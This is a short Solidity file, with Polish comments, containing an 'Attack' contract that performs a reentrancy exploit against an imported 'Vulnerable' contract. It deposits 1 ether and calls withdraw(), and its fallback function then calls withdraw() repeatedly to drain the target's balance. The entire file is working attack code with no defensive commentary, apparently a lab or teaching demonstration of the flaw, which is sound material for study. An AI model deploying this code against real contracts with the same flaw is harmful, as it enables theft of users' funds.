// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vulnerable.sol";

contract Attack {
    Vulnerable public vulnerableContract;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = Vulnerable(_vulnerableContractAddress);
    }

    // Fallback jest wywoływany, gdy Vulnerable wysyła Ether do tego kontraktu
    fallback() external payable {
        if (address(vulnerableContract).balance >= AMOUNT) {
            vulnerableContract.withdraw();
        }
    }

    // Funkcja inicjująca atak
    function attack() external payable {
        require(msg.value >= AMOUNT);
        vulnerableContract.deposit{value: AMOUNT}();
        vulnerableContract.withdraw();
    }

    // Funkcja zwracająca saldo kontraktu Attack
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

